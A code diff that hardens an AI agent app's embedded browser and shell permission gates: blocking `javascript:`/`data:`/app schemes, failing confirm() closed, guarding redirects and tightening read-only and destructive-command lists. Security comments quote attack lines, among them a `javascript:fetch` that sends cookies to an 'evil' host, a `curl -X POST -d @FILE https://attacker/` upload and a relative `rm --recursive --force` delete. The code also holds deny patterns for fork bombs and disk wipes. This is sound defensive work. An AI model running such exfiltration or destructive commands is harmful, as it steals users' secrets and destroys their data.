@@ -2305,6 +2305,54 @@ class AgentService extends ChangeNotifier {
     return navigateTab(tab, url);
   }
 
+  /// Schemes that may be loaded into a live tab.
+  ///
+  /// SECURITY (2026-09-24): the host-grant gate only fired for http/https, so
+  /// every other scheme fell straight through to `loadRequest`. `javascript:`
+  /// executes in the CURRENT page's origin — `javascript:fetch('https://evil/'
+  /// +document.cookie)` runs on a site the user had already granted, using that
+  /// site's cookie jar, with no host grant for `evil` and no prompt. `data:`
+  /// loads unguarded content the same way; `file:` reads local files into a
+  /// page that can then exfiltrate them; app schemes (`mailto:`, `whatsapp:`)
+  /// were handed to the OS from page-initiated JS with no user gesture.
+  ///
+  /// Local previews are unaffected: they resolve through
+  /// [_resolveLocalWebTarget] into the session workspace and load via
+  /// `_loadLocalPreview`/`loadFile`, never through here.
+  static const _loadableSchemes = {'http', 'https', 'about'};
+
+  /// Non-web schemes the embedded browser may hand to the OS. Deliberately
+  /// tiny: each of these only opens a composer the user must still confirm in
+  /// the target app. Anything richer (app deep links, `market:`, `intent:`)
+  /// is refused, because a page can trigger such a navigation from script with
+  /// no user gesture — see [_loadableSchemes].
+  static const _externalLaunchSchemes = {'mailto', 'tel', 'sms', 'geo'};
+
+  /// True when [url] may be loaded into a browser tab. A scheme-less target
+  /// (a relative or absolute path) is allowed: it resolves against the current
+  /// page, or the preview path intercepts it first.
+  static bool isLoadableTabUrl(String url) {
+    final u = url.trim();
+    if (u.isEmpty) return false;
+    final scheme = Uri.tryParse(u)?.scheme.toLowerCase() ?? '';
+    if (scheme.isEmpty) return true;
+    return _loadableSchemes.contains(scheme);
+  }
+
+  /// Refusal text for a URL that must not be loaded, or null when it may be.
+  /// The message tells the model to involve the user rather than retry, so a
+  /// blocked scheme never turns into a silent loop.
+  static String? unloadableUrlReason(String url, {required String tool}) {
+    if (isLoadableTabUrl(url)) return null;
+    final scheme = Uri.tryParse(url.trim())?.scheme.toLowerCase() ?? 'unknown';
+    return '$tool refused a "$scheme:" URL. Only http/https pages can be '
+        'loaded in a browser tab: that scheme would either execute script in '
+        'the current page\'s origin (stealing its cookies), read local files '
+        'into a page that can exfiltrate them, or hand control to another '
+        'app — none of which a host permission grant can cover. Explain what '
+        'you were trying to do and ask the user how to proceed.';
+  }
+
   /// Navigate [tab] to [url], binding its session profile first.
   ///
   /// EVERY navigation must go through here (or await [ensureTabProfile]): the
@@ -2313,6 +2361,11 @@ class AgentService extends ChangeNotifier {
   /// app-wide cookie jar for its whole lifetime — i.e. another session's
   /// logins would be visible in this one.
   Future<void> navigateTab(BrowserTab tab, String url) async {
+    // SECURITY: refuse before ANY state changes, so a rejected URL is never
+    // recorded as the tab's location, remembered as a visited origin, or
+    // handed to the WebView. Tools surface [unloadableUrlReason] to the model;
+    // this is the choke point that also covers the address bar.
+    if (!isLoadableTabUrl(url)) return;
     if (url.startsWith('http')) {
       // Navigating a live-preview tab to the web turns it into a normal tab;
       // otherwise the deferred first load would re-render the preview file
@@ -2954,18 +3007,26 @@ class AgentService extends ChangeNotifier {
             // (missed apply, rewritten meta, old WebView). Covers refresh and
             // SPA navigations — persistence by verification, not by hope.
             unawaited(_verifyDesktopForced(tab, url));
-            // Dialog/popup capture: webview_flutter has no onJsAlert API,
-            // so shim alert/confirm/prompt + window.open once per page.
-            try {
-              tab.controller?.runJavaScript('''
+             // Dialog/popup capture: webview_flutter has no onJsAlert API,
+             // so shim alert/confirm/prompt + window.open once per page.
+             //
+             // SECURITY (2026-09-24): confirm() used to return TRUE for every
+             // page — including pages the user browses by hand — so "Are you
+             // sure you want to delete/send/pay?" was silently answered yes and
+             // the action proceeded with no UI ever shown. It now FAILS CLOSED
+             // (false) while still recording the prompt, so nothing
+             // destructive happens behind the user's back.
+             try {
+               tab.controller?.runJavaScript('''
 window.__ovidDialog = null;
 window.alert = (m) => { window.__ovidDialog = {kind:'alert', message:String(m)}; };
-window.confirm = (m) => { window.__ovidDialog = {kind:'confirm', message:String(m)}; return true; };
-window.prompt = (m, d) => { window.__ovidDialog = {kind:'prompt', message:String(m), defaultValue:String(d ?? '')}; return d ?? ''; };
+window.confirm = (m) => { window.__ovidDialog = {kind:'confirm', message:String(m), answered:false}; return false; };
+window.prompt = (m, d) => { window.__ovidDialog = {kind:'prompt', message:String(m), defaultValue:String(d ?? ''), answered:false}; return null; };
 const _open = window.open;
 window.open = (u) => { window.__ovidPopups = window.__ovidPopups || []; window.__ovidPopups.push(String(u)); return null; };
 ''');
-            } catch (_) {}
+             } catch (_) {}
+
             tab.networkLog.add((
               at: DateTime.now(),
               url: url,
@@ -3042,9 +3103,26 @@ window.open = (u) => { window.__ovidPopups = window.__ovidPopups || []; window._
             if (uri.scheme != 'http' &&
                 uri.scheme != 'https' &&
                 uri.scheme != 'about' &&
-                uri.scheme != 'data' &&
                 !url.startsWith('file:')) {
-              // mailto:, tel:, whatsapp:, custom schemes → the OS handler.
+              // SECURITY (2026-09-24): onNavigationRequest fires for
+              // JS-initiated navigations too, and this branch used to hand
+              // EVERY non-http scheme to the OS. A hostile page — opened by the
+              // agent or the user — could therefore fire `whatsapp://send?…`,
+              // `sms:`, `market://` or a banking app's privileged scheme with
+              // no user gesture at all. Now only schemes that cannot trigger a
+              // privileged action on their own are launched, and only for a
+              // main-frame navigation. Everything else (including `data:`) is
+              // prevented.
+              final scheme = uri.scheme.toLowerCase();
+              if (!_externalLaunchSchemes.contains(scheme) ||
+                  !request.isMainFrame) {
+                _emit(
+                  'shell',
+                  'blocked a "$scheme:" navigation — only mailto/tel/sms/geo '
+                      'links may leave the app.',
+                );
+                return NavigationDecision.prevent;
+              }
               try {
                 await launchUrl(uri, mode: LaunchMode.externalApplication);
               } catch (_) {}
@@ -9757,8 +9835,8 @@ ${await _agentsMdBlock()}
         onTimeout: () {
           lastError =
               'no response from ${p.name} for '
-              '${AppState.I.responseTimeoutSec}s — Settings me '
-              'Increase "AI response timeout" or check the provider';
+              '${AppState.I.responseTimeoutSec}s — increase "AI response '
+              'timeout" in Settings, or check the provider';
           throw TimeoutException(lastError ?? 'first-byte timeout');
         },
       );
@@ -9867,8 +9945,8 @@ ${await _agentsMdBlock()}
               .transform(
                 _IdleResetTimeout(idleBudget, (msg) {
                   lastError =
-                      'model stream idle for ${idleBudget.inSeconds}s — Settings '
-                      'me timeout badhayein';
+                      'model stream idle for ${idleBudget.inSeconds}s — '
+                      'increase "AI response timeout" in Settings';
                   return TimeoutException(lastError ?? 'model stream timeout');
                 }),
               )) {
@@ -10269,8 +10347,8 @@ ${await _agentsMdBlock()}
         onTimeout: () {
           lastError =
               'no response from ${p.name} for '
-              '${AppState.I.responseTimeoutSec}s — Settings me '
-              'Increase "AI response timeout" or check the provider';
+              '${AppState.I.responseTimeoutSec}s — increase "AI response '
+              'timeout" in Settings, or check the provider';
           throw TimeoutException(lastError ?? 'first-byte timeout');
         },
       );
@@ -10316,8 +10394,8 @@ ${await _agentsMdBlock()}
               .transform(
                 _IdleResetTimeout(idleBudget, (msg) {
                   lastError =
-                      'model stream idle for ${idleBudget.inSeconds}s — Settings '
-                      'me timeout badhayein';
+                      'model stream idle for ${idleBudget.inSeconds}s — '
+                      'increase "AI response timeout" in Settings';
                   return TimeoutException(lastError ?? 'model stream timeout');
                 }),
               )) {
@@ -10821,10 +10899,11 @@ ${await _agentsMdBlock()}
         final granted = await _askUser(
           'request_permission',
           perm,
-          'AI ko device permission chahiye: $label\n'
+          'The agent needs a device permission: $label\n'
               '• Permission: $perm\n'
               '• Reason: ${reason.isEmpty ? '(no reason given)' : reason}\n\n'
-              'Allow karne par Android system dialog aayegi.',
+              'Allowing shows the Android system dialog, where you make the '
+              'final choice.',
         );
         if (!granted) {
           _emit('shellOut', '$perm → DENIED by user');
@@ -10843,7 +10922,7 @@ ${await _agentsMdBlock()}
         final ok = await _maybeApprove(
           'browser_open',
           url,
-          'Browser panel me ye page khulega:\n$url',
+          'This page will open in the Browser panel:\n$url',
         );
         if (!ok) return 'DENIED by user';
         // ── file:// / local-path interception (ERR_ACCESS_DENIED fix) ──
@@ -10864,6 +10943,10 @@ ${await _agentsMdBlock()}
           return 'local file not found: $url — save the project files in '
               'the session workspace first, then retry.';
         }
+        // SECURITY: refuse script/app schemes BEFORE navigating — see
+        // [_loadableSchemes].
+        final schemeRefusal = unloadableUrlReason(url, tool: 'browser_open');
+        if (schemeRefusal != null) return schemeRefusal;
         _emit('nav', url);
         browserBusy = true;
         notifyListeners();
@@ -10928,7 +11011,7 @@ ${await _agentsMdBlock()}
         final ok = await _maybeApprove(
           'browser_navigate',
           url,
-          'Browser me ye page khulega:\n$url',
+          'This page will open in the browser:\n$url',
         );
         if (!ok) return 'DENIED by user';
         // Same local-file interception as browser_open (ERR_ACCESS_DENIED
@@ -10942,6 +11025,13 @@ ${await _agentsMdBlock()}
           }
           return 'local file not found: $url';
         }
+        // SECURITY: refuse script/app schemes BEFORE navigating — see
+        // [_loadableSchemes].
+        final schemeRefusal2 = unloadableUrlReason(
+          url,
+          tool: 'browser_navigate',
+        );
+        if (schemeRefusal2 != null) return schemeRefusal2;
         // Strict permission model: same host-grant gate as browser_open.
         final navUri2 = Uri.tryParse(url);
         final navScheme2 = navUri2?.scheme.toLowerCase() ?? '';
@@ -10965,7 +11055,7 @@ ${await _agentsMdBlock()}
         final ok = await _maybeApprove(
           'browser_new_tab',
           url,
-          'AI naya browser tab kholega:\n$url',
+          'The agent will open a new browser tab:\n$url',
         );
         if (!ok) return 'DENIED by user';
         newBrowserTab(url); // creates tab + loads url, persists to prefs
@@ -11080,6 +11170,10 @@ ${await _agentsMdBlock()}
           final r = await HttpShim.get(
             uri,
             headers: {'User-Agent': 'OvidAgent/1.0'},
+            // SECURITY: re-check the host on EVERY redirect hop, so a granted
+            // site cannot bounce the request to a private range or loopback.
+            redirectGuard: (next) =>
+                _checkHostGrant(next.host, tool: 'fetch_url'),
           );
           final body = utf8.decode(r.bytes, allowMalformed: true);
           return await spillToolOutput(name, _htmlToMarkdown(body), cap: 8000);
@@ -13090,20 +13184,30 @@ ${await _agentsMdBlock()}
   /// • fork bombs
   /// • recursive chmod/chown to 777 on root paths
   /// • wiping the sandbox (rm -rf $PREFIX) or factory resets
+  /// Destructive commands — ALWAYS prompt (no always-allow outside Studio).
+  ///
+  /// The catastrophic set is shared with the sandbox's hard-deny list so the
+  /// two gates can never drift apart again (they were duplicated copies). The
+  /// extra patterns here are *escapes*: deleting outside the workspace should
+  /// reach the user as an Allow / Deny / Always Allow prompt, not be silently
+  /// hard-denied.
+  ///
+  /// SECURITY (2026-09-24): both patterns below were missing, so
+  /// `rm --recursive --force ../../shared_prefs` — which from a workspace cwd
+  /// is the app's own SharedPreferences dir, holding every session, setting and
+  /// grant — ran in General mode with no prompt at all.
   static const _destructivePatterns = [
-    r'\brm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+(/[^\s]*|\$HOME|~)([^\w]|$)',
-    r'\brm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s+(/|\$HOME|~)',
-    r'\bdd\s+[^|]*if=/dev/(block|zero|random)',
-    r'\bmkfs(\.\w+)?\s',
-    // Fork bomb: `:(){ :|:& };:` (with or without spaces).
-    r':\s*\(\s*\)\s*\{.*\}\s*;\s*:',
-    r'\bchmod\s+-R\s+777\s+/',
-    r'\bchown\s+-R\s+\S+\s+/\s*$',
-    r'\b(reboot|shutdown|halt)\b',
-    r'>\s*/dev/sd[a-z]',
-    r'\brm\s+-rf\s+\$PREFIX',
-    r'\bfind\s+/.*-delete\b',
+    ...SandboxService.defaultDeniedCommands,
+    // Recursive/forced delete that leaves the workspace RELATIVELY. It never
+    // names `/`, so the absolute-target pattern above cannot see it.
+    r'\brm\s+(-{1,2}[a-zA-Z-]*[rf][a-zA-Z-]*\s+)+\.\./',
+    // `find -delete` in any position: recursive deletion by another name.
+    r'\bfind\b[^|;&]*\s-delete\b',
   ];
+
+  /// Test seam for the destructive-command patterns.
+  @visibleForTesting
+  static List<String> get destructivePatternsForTest => _destructivePatterns;
 
   bool _isDestructiveCommand(String cmd) => isDestructiveCommand(cmd);
 
@@ -13142,6 +13246,19 @@ ${await _agentsMdBlock()}
 
   /// Read-only command detector for the "Auto-run safe commands" setting:
   /// ON (default) → read-only shell commands skip the safe-mode confirm.
+  ///
+  /// SECURITY (2026-09-24) — deliberately ABSENT from this list, do not
+  /// re-add without a gate:
+  ///   • `env` / `printenv` — dump every child-process secret (git credential
+  ///     path, MCP/plugin env). Auto-running them in Read-Only mode was an
+  ///     unprompted exfiltration channel.
+  ///   • `curl -s` / `curl -I` — matched by PREFIX, so `curl -s -X POST
+  ///     -d @FILE https://attacker/` classified as read-only. Shell egress
+  ///     never reaches `_checkHostGrant`, so this bypassed the network
+  ///     permission model entirely. Only the bare `--version` probe is listed,
+  ///     and [isReadOnlyCommand] rejects any other curl/wget form.
+  ///   • `mount` / `ip addr` / `ifconfig` — read-only bare, mutating with a
+  ///     subcommand (`mount -o remount`, `ip addr add`, `ifconfig eth0 up`).
   static const _readOnlyCommands = [
     'ls',
     'cat',
@@ -13159,8 +13276,6 @@ ${await _agentsMdBlock()}
     'id',
     'uname',
     'uptime',
-    'env',
-    'printenv',
     'which',
     'command',
     'type',
@@ -13189,15 +13304,10 @@ ${await _agentsMdBlock()}
     'pip show',
     'pip --version',
     'curl --version',
-    'curl -I',
-    'curl -s',
     'wget --version',
     'ps',
     'top',
     'lsblk',
-    'mount',
-    'ip addr',
-    'ifconfig',
     'netstat',
     'ping',
     'dig',
@@ -13205,6 +13315,12 @@ ${await _agentsMdBlock()}
     'traceroute',
     'tree',
   ];
+
+  /// `find` actions that write, delete or execute. Everything else in a
+  /// `find` invocation is a pure search.
+  static final _findMutatingAction = RegExp(
+    r'(^|\s)-(delete|exec|execdir|ok|okdir|fls|fprint|fprint0|fprintf)\b',
+  );
 
   bool _isReadOnlyCommand(String cmd) => isReadOnlyCommand(cmd);
 
@@ -13225,6 +13341,16 @@ ${await _agentsMdBlock()}
     for (final seg in c.split(RegExp(r'&&|\|\||;|\|'))) {
       final s = seg.trim();
       if (s.isEmpty) continue;
+      final head = s.split(RegExp(r'\s+')).first;
+      // curl/wget can fetch, POST or write regardless of which flags we
+      // inspect, so only the exact bare version probe counts as read-only —
+      // `curl --version -o /sdcard/x` must not ride the prefix match.
+      if ((head == 'curl' || head == 'wget') && s != '$head --version') {
+        return false;
+      }
+      // `find` searches, but its actions mutate: -delete removes and -exec
+      // runs anything at all.
+      if (head == 'find' && _findMutatingAction.hasMatch(s)) return false;
       var matched = false;
       for (final ro in _readOnlyCommands) {
         if (s == ro || s.startsWith('$ro ') || s.startsWith('$ro\t')) {
@@ -18562,11 +18688,21 @@ class HttpShim {
     );
   }
 
+  /// Per-hop redirect guard. When supplied to [get], redirects are followed
+  /// MANUALLY and every hop is offered to the guard; a `false` return stops the
+  /// chain and the redirect response itself is returned.
+  ///
+  /// SECURITY (2026-09-24): without this, a host the user granted can 302 the
+  /// request to `http://192.168.1.1/`, a cloud metadata endpoint or loopback —
+  /// the host grant was only ever checked against the INITIAL URL, and
+  /// `HttpClient.followRedirects` defaults to true.
   static Future<({int status, String bodyText, List<int> bytes})> get(
     Uri u, {
     Map<String, String>? headers,
     Duration timeout = _requestTimeout,
     int maxResponseBytes = _maxResponseBytes,
+    Future<bool> Function(Uri target)? redirectGuard,
+    int maxRedirects = 5,
   }) async {
     final client = HttpClient();
     try {
@@ -18576,6 +18712,8 @@ class HttpShim {
         headers: headers,
         timeout: timeout,
         maxResponseBytes: maxResponseBytes,
+        redirectGuard: redirectGuard,
+        maxRedirects: maxRedirects,
       ).timeout(timeout);
     } finally {
       client.close(force: true);
@@ -18588,17 +18726,50 @@ class HttpShim {
     Map<String, String>? headers,
     required Duration timeout,
     required int maxResponseBytes,
+    Future<bool> Function(Uri target)? redirectGuard,
+    int maxRedirects = 5,
   }) async {
     client.connectionTimeout = timeout;
-    final req = await client.getUrl(u);
-    headers?.forEach((k, v) => req.headers.set(k, v));
-    final res = await req.close();
-    final data = await _readBounded(res, maxResponseBytes);
-    return (
-      status: res.statusCode,
-      bodyText: utf8.decode(data, allowMalformed: true),
-      bytes: data,
-    );
+    var target = u;
+    var hops = 0;
+    while (true) {
+      final req = await client.getUrl(target);
+      headers?.forEach((k, v) => req.headers.set(k, v));
+      // A guarded request must not let the client follow redirects itself —
+      // that is the whole point of the guard.
+      req.followRedirects = redirectGuard == null;
+      req.maxRedirects = redirectGuard == null ? maxRedirects : 0;
+      final res = await req.close();
+      final location = res.headers.value('location');
+      final guarded =
+          redirectGuard != null &&
+          res.isRedirect &&
+          location != null &&
+          hops < maxRedirects;
+      if (!guarded) {
+        final data = await _readBounded(res, maxResponseBytes);
+        return (
+          status: res.statusCode,
+          bodyText: utf8.decode(data, allowMalformed: true),
+          bytes: data,
+        );
+      }
+      final next = target.resolveUri(Uri.parse(location));
+      hops++;
+      if (!await redirectGuard(next)) {
+        // Refused hop: report the redirect instead of silently following into
+        // a private range or another app's loopback listener.
+        await _readBounded(res, maxResponseBytes);
+        return (
+          status: res.statusCode,
+          bodyText:
+              'redirect to $next was refused by the permission gate '
+              '(status ${res.statusCode})',
+          bytes: const <int>[],
+        );
+      }
+      target = next;
+    }
   }
 
   static Future<List<int>> _readBounded(
